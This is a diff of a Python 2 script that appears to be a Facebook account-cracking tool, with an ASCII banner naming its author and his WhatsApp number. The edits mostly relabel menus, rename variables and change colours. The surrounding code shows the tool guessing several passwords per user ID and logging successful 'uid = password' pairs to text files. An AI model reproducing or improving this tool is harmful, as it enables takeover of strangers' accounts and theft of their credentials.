@@ -79,12 +79,12 @@ logo = """
                                     
 \033[1;92m-----------------------------------------------
 \033[1;93m OWNER IZ : Awais Khan
-\033[1;94m WATHSAP  : 03173725015
+\033[1;94m WATSAPP  : 03173725015
 \033[1;96m-----------------------------------------------
 \033[1;95m Facebook : https://www.facebook.com/Mohmand.awais
 \033[1;97m-----------------------------------------------
 \033[1;92m-----------------------------------------------                           
-                 USE 4G FAST SPEED INTERNET
+               USE 4G FAST SPEED INTERNET
 \033[1;96m-----------------------------------------------
  
 """
@@ -103,7 +103,7 @@ def main():
  
     print("")
  
-    print("\033[1;95m[1]\033[1;97mSTART CLONiNG....")
+    print("\033[1;95m[1]\033[1;97mSTART CRACKING....")
  
     print("")
  
@@ -119,19 +119,19 @@ def main():
  
 def main_select():
  
-    bilal = raw_input("\033[1;95m[#] Choose Opition --->\033[1;96m ")
+    Awais = raw_input("\033[1;95m[#] Choose Opition --->\033[1;96m ")
  
-    if bilal  =="1":
+    if Awais  =="1":
  
         login()
  
-    if bilal =="2":
+    if Awais =="2":
  
         os.system("xdg-open https://www.facebook.com/Mohmand.awais")
  
 	main()  
  
-    elif bilal =="0":
+    elif Awais =="0":
  
         os.system("exit")
  
@@ -228,11 +228,11 @@ def login_select():
  
             login()
  
-    elif bilal =="2":
+    elif Awais =="2":
  
         os.system("xdg-open https://www.facebook.com/Mohmand.awais")
  
-    elif bilal =="3":
+    elif Awais =="3":
  
         main()
  
@@ -501,7 +501,7 @@ def menu_select():
  
 		    if 'www.facebook.com' in d['error_msg']:
  
-		        print("\033[1;95m Awais Ok"+uid+" = "+pass1)
+		        print("\033[1;95m Awais Ok "+uid+" = "+pass1)
  
 		        cp=open("awaisok.txt","a")
  
@@ -535,7 +535,7 @@ def menu_select():
  
 		            if 'www.facebook.com' in d['error_msg']:
  
-		                print("\033[1;95mAwais Ok "+uid+" = "+pass2)
+		                print("\033[1;95mAwais cp "+uid+" = "+pass2)
  
 		                cp=open("awaisok.txt","a")
  
@@ -549,7 +549,7 @@ def menu_select():
  
 		                if 'access_token' in d:
  
-		                    print("\x1b[1;97mAwais Ok "+uid+" = "+pass2+"\x1b[1;0m")
+		                    print("\x1b[1;92mAwais Ok "+uid+" = "+pass2+"\x1b[1;0m")
  
 		                    ok=open("awaisok.txt","a")
  
@@ -569,7 +569,7 @@ def menu_select():
  
 		                    if 'www.facebook.com' in d['error_msg']:
  
-		                        print("\033[1;95mAwais Ok "+uid+" = "+pass3)
+		                        print("\033[1;92mAwais Ok "+uid+" = "+pass3)
  
 		                        cp=open("awaisok.txt","a")
  
@@ -603,7 +603,7 @@ def menu_select():
  
 		                            if 'www.facebook.com' in d['error_msg']:
  
-		                                print("\033[1;93mAwais Ok "+uid+" = "+pass4)
+		                                print("\033[1;92mAwais Ok "+uid+" = "+pass4)
  
 		                                cp=open("awaisok.txt","a")
  
@@ -617,7 +617,7 @@ def menu_select():
  
 		                                if 'access_token' in d:
  
-		                                    print("\x1b[1;92mAwais Ok"+uid+" = "+pass4+"\x1b[1;0m")
+		                                    print("\x1b[1;92mAwais Ok "+uid+" = "+pass4+"\x1b[1;0m")
  
 		                                    ok=open("awaisok.txt","a")
  
@@ -637,9 +637,9 @@ def menu_select():
  
 		                                    if 'www.facebook.com' in d['error_msg']:
  
-		                                        print("\033[1;95mAwais Ok"+uid+" = "+pass5)
+		                                        print("\033[1;95mAwais co "+uid+" = "+pass5)
  
-		                                        cp=open("awaisok.txt","a")
+		                                        cp=open("awaiscp.txt","a")
  
 		                                        cp.write(uid+" = "+pass5+"\n")
  
@@ -671,7 +671,7 @@ def menu_select():
  
 		                                            if 'www.facebook.com' in d['error_msg']:
  
-		                                                print("\033[1;95mAwais Ok "+uid+" = "+pass6)
+		                                                print("\033[1;92mAwais Ok "+uid+" = "+pass6)
  
 		                                                cp=open("awaisok.txt","a")
  
@@ -705,7 +705,7 @@ def menu_select():
  
 		                                                    if 'www.facebook.com' in d['error_msg']:
  
-		                                                        print("\033[1;93mAwais Ok"+uid+" = "+pass7)
+		                                                        print("\033[1;92mAwais Ok"+uid+" = "+pass7)
  
 		                                                        cp=open("awaisok.txt","a")
  
@@ -719,7 +719,7 @@ def menu_select():
  
 		                                                        if 'access_token' in d:
  
-		                                                            print("\x1b[1;97mAwais Ok "+uid+" = "+pass7+"\x1b[1;0m")
+		                                                            print("\x1b[1;92mAwais Ok "+uid+" = "+pass7+"\x1b[1;0m")
  
 		                                                            ok=open("awaisok.txt","a")
  
